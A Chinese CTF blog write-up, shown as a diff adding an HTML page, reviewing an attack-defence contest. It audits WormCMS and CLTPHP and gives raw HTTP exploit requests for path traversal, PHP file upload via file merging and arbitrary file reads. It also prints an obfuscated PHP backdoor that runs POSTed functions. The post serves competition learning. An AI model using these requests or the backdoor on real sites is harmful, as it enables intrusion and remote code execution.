@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web,代码审计," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这次比赛侥幸拿到第二，这里记录下赛后的一些复现和思考。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绿盟杯awd总结">
+<meta property="og:url" content="http://www.star123.top/2021/12/05/%E7%BB%BF%E7%9B%9F%E6%9D%AFawd%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="这次比赛侥幸拿到第二，这里记录下赛后的一些复现和思考。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/Z7xEdLF8ANIgsbR.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/kUygpRt2odVsr9a.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/9sNvB81xKr2Ddj7.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/1HTeZx8ipj93bWr.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/07/LJGyQA3VXNaZPBk.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/VRfnXYhdpl5iPLZ.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/shTMyUFxRp7iuLH.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/M6xXJ18QY3ZqPKs.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/nBLWbGuZA1ea26d.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/TMWjIPqdhHVlFOD.png">
+<meta property="og:image" content="https://s2.loli.net/2021/12/06/WGSn74LkQ8mVhEi.png">
+<meta property="article:published_time" content="2021-12-05T14:52:45.000Z">
+<meta property="article:modified_time" content="2021-12-07T11:19:43.541Z">
+<meta property="article:author" content="star">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2021/12/06/Z7xEdLF8ANIgsbR.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2021/12/05/绿盟杯awd总结/"/>
+
+
+
+
+
+  <title>绿盟杯awd总结 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2021/12/05/%E7%BB%BF%E7%9B%9F%E6%9D%AFawd%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">绿盟杯awd总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-05T22:52:45+08:00">
+                2021-12-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这次比赛侥幸拿到第二，这里记录下赛后的一些复现和思考。</p>
+<a id="more"></a>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>awd的话，其实个人的理解主要是两块，审计和形成exp。其中审计的速度决定了修题的速度，快速形成exp决定了收割的速度。当然，适当的准备是必不可少的（比如提交脚本），但是如果准备过于复杂的脚本或者工具，的确可能会在比赛中造成一些麻烦。</p>
+<p>这轮两个web题一个是tp6，一个是tp5，其中tp5的版本是5.1.40，不在rce的版本内，另外一个是6.0.7，没有直接看到外部传参到session中的情况，那基本上就是挖day的情况。</p>
+<p>tp的路由和laravel相比，更加灵活，只要存在于控制器中public的方法，都能被调用到，基本上是/index.php/module/controller/action这样的方式去调用。</p>
+<p>拿到题目有几个事情是需要做的。首先是修改ssh的密码，然后是备份数据库和web目录下的文件，上一些文件监控和waf，最后记得修改数据库中管理员账号的密码，可能存在默认口令的情况。</p>
+<p>拿到源码先无脑d盾看下，然后再审，大概率都会有一两个后门，一般第一轮都可以借个漏。</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>Wormcms，在api/controller/upload.php中貌似修了最新版的几个洞，比如把几个能直接传文件的路由给换成了protected。</p>
+<p><img src="https://s2.loli.net/2021/12/06/Z7xEdLF8ANIgsbR.png" alt="image-20211206000311971"></p>
+<h3 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h3><p>仔细研究他的上传逻辑，发现了一些问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function index(cxModel $cxmodel)&#123;</span><br><span class="line">        $data &#x3D; Common::data_trim(input(&#39;post.&#39;));</span><br><span class="line">        if($cxmodel-&gt;checkFilename($data))&#123;</span><br><span class="line">          return $this-&gt;error(&quot;上传失败&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">        &#x2F;&#x2F;  合并文件</span><br><span class="line">        if(!empty($data[&#39;flieSet&#39;]) &amp;&amp; $data[&#39;flieSet&#39;] &#x3D;&#x3D; &#39;end&#39;)&#123;</span><br><span class="line">           $set_file &#x3D; $cxmodel-&gt;pushFiles($data);</span><br><span class="line">           ...</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">        $files &#x3D; $this-&gt;request-&gt;file();</span><br><span class="line">    		&#x2F;&#x2F;上传文件</span><br><span class="line">    		$set_file &#x3D; $cxmodel-&gt;setBig($v,$data);</span><br><span class="line">        return $this-&gt;success(&quot;上传成功&quot;,&#39;&#39;,$set_file);</span><br></pre></td></tr></table></figure>
+
+<p>他的checkfile函数校验文件名和文件后缀均使用黑名单。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function checkFilename($data)&#123;</span><br><span class="line">         if(preg_match(&#39;&#x2F;h|user|ini|php&#x2F;&#39;, $data[&#39;prefix&#39;])||preg_match(&#39;&#x2F;h|user|ini|php&#x2F;&#39;, $data[&#39;md5&#39;]))&#123;</span><br><span class="line">             return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而setBig函数中，直接拼接了md5(文件名)和prefix(后缀名)。</p>
+<p><img src="https://s2.loli.net/2021/12/06/kUygpRt2odVsr9a.png" alt="image-20211206001033046"></p>
+<p>文件名并没有考虑限制到跨目录的情况，而后缀名是可以为空的，这里其实是可以通过跨目录写文件完成session伪造的利用。</p>
+<h3 id="合并文件处的文件上传漏洞"><a href="#合并文件处的文件上传漏洞" class="headerlink" title="合并文件处的文件上传漏洞"></a>合并文件处的文件上传漏洞</h3><p>这里的逻辑有点问题，直接取了name被.分割后的第一部分作为后缀名，然后以添加模式打开目标文件。文件的内容来自不受任何过滤的file_list，因此结合普通的上传，意味着可以将任意内容写入xxx.php文件中。这里的利用思路可以是这样的，首先上传任意文件到服务器中，然后再利用该漏洞读取先前上传的文件，并将文件内容写入xxx.php中，完成利用。</p>
+<p><img src="https://s2.loli.net/2021/12/06/9sNvB81xKr2Ddj7.png" alt="image-20211206001656795"></p>
+<h4 id="文件上传利用"><a href="#文件上传利用" class="headerlink" title="文件上传利用"></a>文件上传利用</h4><ul>
+<li>上传txt文件，文件内容中包含恶意内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php&#x2F;api&#x2F;upload&#x2F;index HTTP&#x2F;1.1</span><br><span class="line">User-Agent: PostmanRuntime&#x2F;7.28.4</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Postman-Token: da3a6f25-b27c-49ee-b904-6b892cec39ba</span><br><span class="line">Host: www.wormcms.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------------------------068186580283755634911962</span><br><span class="line">Content-Length: 456</span><br><span class="line"></span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.txt&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">&lt;?php echo(file_get_contents(&quot;&#x2F;flag.txt&quot;));?&gt;</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;prefix&quot;</span><br><span class="line"></span><br><span class="line">txt</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;md5&quot;</span><br><span class="line"></span><br><span class="line">txt</span><br><span class="line">----------------------------068186580283755634911962--</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用合并功能将前面上传的文件内容写到我们控制的位置，这里文件名为md5+name后面的后缀名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php&#x2F;api&#x2F;upload&#x2F;index HTTP&#x2F;1.1</span><br><span class="line">User-Agent: PostmanRuntime&#x2F;7.28.4</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Postman-Token: da3a6f25-b27c-49ee-b904-6b892cec39ba</span><br><span class="line">Host: www.wormcms.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------------------------068186580283755634911962</span><br><span class="line">Content-Length: 903</span><br><span class="line"></span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">&lt;?php var_dump(12312);?&gt;</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;prefix&quot;</span><br><span class="line"></span><br><span class="line">p</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;name&quot;</span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;flieSet&quot;</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_list[]&quot;</span><br><span class="line"></span><br><span class="line">txt.txt</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_list[]&quot;</span><br><span class="line"></span><br><span class="line">txt.txt</span><br><span class="line">----------------------------068186580283755634911962</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;md5&quot;</span><br><span class="line"></span><br><span class="line">asdasdasdasd</span><br><span class="line">----------------------------068186580283755634911962--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="后台任意文件读取"><a href="#后台任意文件读取" class="headerlink" title="后台任意文件读取"></a>后台任意文件读取</h3><p>admin/controller/label.php中存在任意文件读取的漏洞，read_file函数的逻辑和file_get_contents基本一致。</p>
+<p><img src="https://s2.loli.net/2021/12/06/1HTeZx8ipj93bWr.png" alt="image-20211206003012742"></p>
+<p><img src="https://s2.loli.net/2021/12/07/LJGyQA3VXNaZPBk.png" alt="image-20211207191551278"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php&#x2F;admin&#x2F;label&#x2F;getView.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.wormcms1.com</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;www.wormcms1.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.55 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;www.wormcms1.com&#x2F;index.php&#x2F;admin&#x2F;label&#x2F;getView.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8,ja;q&#x3D;0.7</span><br><span class="line">Cookie: WORMCMS&#x3D;0080915d28d295d9288262bbfc44b1c5</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">data&#x3D;..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>cltphp cms。</p>
+<h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><p>这个洞我比赛时候没用过，不过我们队修了。</p>
+<p>wechat/controller/Wechat.php的getMessage方法，理论上来说libxml版本够小是可以读文件或者触发phar协议来rce。</p>
+<p><img src="https://s2.loli.net/2021/12/06/VRfnXYhdpl5iPLZ.png" alt="image-20211206210337620"></p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>home/controller/index.php，直接跨目录读文件。</p>
+<p><img src="https://s2.loli.net/2021/12/06/shTMyUFxRp7iuLH.png" alt="image-20211206004520860"></p>
+<p><img src="https://s2.loli.net/2021/12/06/M6xXJ18QY3ZqPKs.png" alt="image-20211206210634378"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php&#x2F;home&#x2F;Index&#x2F;downloadsource.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.cltphp.cn</span><br><span class="line">Content-Length: 70</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.55 Safari&#x2F;537.36</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.10.221</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.10.221&#x2F;index.php&#x2F;home&#x2F;Index&#x2F;downloadsource.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8,ja;q&#x3D;0.7</span><br><span class="line">Cookie: PHPSESSID&#x3D;gn6b5jktmk0th5vrr547c5ru4d</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">file&#x3D;%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag&amp;type&#x3D;js</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>Install/config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_++;</span><br><span class="line">$__=(<span class="string">"#"</span>^<span class="string">"|"</span>);</span><br><span class="line">$__.=(<span class="string">"."</span>^<span class="string">"~"</span>);</span><br><span class="line">$__.=(<span class="string">"/"</span>^<span class="string">"`"</span>);</span><br><span class="line">$__.=(<span class="string">"|"</span>^<span class="string">"/"</span>);</span><br><span class="line">$__.=(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line">$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="number">0</span>]($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="后台template-任意文件读取"><a href="#后台template-任意文件读取" class="headerlink" title="后台template 任意文件读取"></a>后台template 任意文件读取</h3><p>admin/controll/template.php基本每个方法都有问题，基本就是没限制跨目录，也没限制后缀名，这里就拿edit方法举例，不过模板这里</p>
+<p><img src="https://s2.loli.net/2021/12/06/nBLWbGuZA1ea26d.png" alt="image-20211206201328028"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php&#x2F;admin&#x2F;template&#x2F;edit.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.cltphp.cn</span><br><span class="line">Content-Length: 73</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">DNT: 1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;96.0.4664.55 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;www.cltphp.cn</span><br><span class="line">Referer: http:&#x2F;&#x2F;www.cltphp.cn&#x2F;index.php&#x2F;admin&#x2F;template&#x2F;add.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8,ja;q&#x3D;0.7</span><br><span class="line">Cookie: skin&#x3D;0; PHPSESSID&#x3D;9gj0jp99am4hreq788e5jcs9oi</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type&#x3D;html&amp;file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar触发点"><a href="#phar触发点" class="headerlink" title="phar触发点"></a>phar触发点</h3><p>admin/controller/Link.php的Exi方法，file_exists前缀可控，因此可以用于触发phar文件从而导致代码执行。</p>
+<p><img src="https://s2.loli.net/2021/12/06/TMWjIPqdhHVlFOD.png" alt="image-20211206214106667"></p>
+<p><img src="https://s2.loli.net/2021/12/06/WGSn74LkQ8mVhEi.png" alt="image-20211206214125628"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实这两个cms的问题还都有不少，比赛的时候因为时间的原因，或是没打出来，或是只挑选了比较好利用的洞。但现在看来，能直接利用的还是有不少。比较需要反思的一个点是web2的修复不完全，没有考虑到目录穿越到session伪造的思路，而web3虽然修了后台默认密码，但是没有考虑去利用这点导致失了很多分。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/21/CVE-2021-2394%E5%88%86%E6%9E%90/" rel="next" title="CVE-2021-2394分析">
+                <i class="fa fa-chevron-left"></i> CVE-2021-2394分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
